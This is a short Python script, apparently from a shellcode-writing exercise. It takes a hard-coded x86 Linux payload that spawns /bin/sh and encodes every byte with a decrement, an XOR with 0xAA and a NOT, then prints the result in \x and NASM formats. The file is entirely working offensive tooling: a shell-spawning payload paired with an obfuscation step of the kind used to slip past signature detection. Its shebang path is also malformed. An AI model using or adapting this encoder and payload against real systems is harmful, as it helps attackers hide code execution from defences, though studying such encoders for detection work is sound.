#!/usr/env/python3

# XOR, DEC, NOT shellcode encoder

shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# intialize variables
encoded_shellcode = ""
encoded_nasm = ""

for x in bytearray(shellcode) :
	
	# DEC
	x = x - 0x01
	
	# XOR with OxAA 	
	y = x^0xAA
	
	# NOT encode
	z = ~y
	
	# shellcode format with \x
	encoded_shellcode += "\\x"
	
	# hex format with AND operation for 2's complement
	encoded_shellcode += "%02x" %(z & 0xff)

	# shellcode format for pasting in nasm file
	encoded_nasm += "0x"
	encoded_nasm += "%02x," %(z & 0xff)


print('Encoded shellcode:')
print(encoded_shellcode)

print('Shellcode for nasm:')
print(encoded_nasm)

print('Shellcode Length: %d' % len(bytearray(shellcode)))
